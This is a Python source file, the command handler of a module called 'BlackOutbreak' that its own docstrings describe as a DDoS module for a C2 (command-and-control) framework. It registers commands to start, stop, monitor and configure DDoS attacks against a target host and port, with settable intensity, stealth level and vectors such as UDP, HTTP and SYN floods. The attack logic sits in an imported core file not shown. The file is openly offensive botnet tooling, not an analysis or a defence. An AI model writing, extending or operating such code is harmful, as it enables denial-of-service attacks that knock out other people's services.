"""
BlackOutbreak Command Handler
Handles commands for BlackOutbreak DDoS module
"""
import logging
import json
from typing import Dict, Any, Optional, List
from .blackoutbreak_core import BlackOutbreak

# Global instance
outbreak_instance = None


def get_instance(config: Optional[Dict[str, Any]] = None) -> BlackOutbreak:
    """Get or create the BlackOutbreak instance
    
    Args:
        config: Optional configuration dictionary
        
    Returns:
        BlackOutbreak instance
    """
    global outbreak_instance
    
    if outbreak_instance is None:
        outbreak_instance = BlackOutbreak(config)
    
    return outbreak_instance


def handle_command(command: str, args: Optional[List[str]] = None, 
                   data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Handle C2 command
    
    Args:
        command: Command name
        args: Command arguments
        data: Additional data
        
    Returns:
        Command result
    """
    logger = logging.getLogger("BlackOutbreak.Handler")
    
    try:
        # Get BlackOutbreak instance
        outbreak = get_instance()
        
        # Format full command
        if args:
            full_command = f"{command} {' '.join(args)}"
        else:
            full_command = command
        
        # Process command
        result = outbreak.handle_command(full_command)
        
        return {
            "status": "success",
            "output": result
        }
        
    except Exception as e:
        logger.error(f"Error handling command {command}: {e}")
        return {
            "status": "error",
            "error": str(e)
        }


def register_commands() -> Dict[str, Any]:
    """Register commands with the C2 framework
    
    Returns:
        Dictionary of command definitions
    """
    return {
        "ddos_start": {
            "help": "Start a DDoS attack: ddos_start <target> <intensity> <stealth> <vectors> [duration]",
            "handler": handle_command,
            "description": "Launch DDoS attack against a target",
            "usage": "ddos_start target:port intensity(1-10) stealth(1-10) vector1,vector2,... [duration]",
            "example": "ddos_start example.com:80 5 7 udp,http,syn 300"
        },
        "ddos_stop": {
            "help": "Stop a DDoS attack: ddos_stop <attack_id>",
            "handler": handle_command,
            "description": "Stop an active DDoS attack",
            "usage": "ddos_stop <attack_id>",
            "example": "ddos_stop a1b2c3d4"
        },
        "ddos_status": {
            "help": "Get status of active DDoS attacks: ddos_status [attack_id]",
            "handler": handle_command,
            "description": "View status of active DDoS attacks",
            "usage": "ddos_status [attack_id]",
            "example": "ddos_status"
        },
        "ddos_config": {
            "help": "Configure DDoS module: ddos_config <param>=<value> [<param2>=<value2> ...]",
            "handler": handle_command,
            "description": "Set configuration parameters for the DDoS module",
            "usage": "ddos_config param=value [param2=value2 ...]",
            "example": "ddos_config default_intensity=8 max_concurrent_attacks=5"
        }
    }
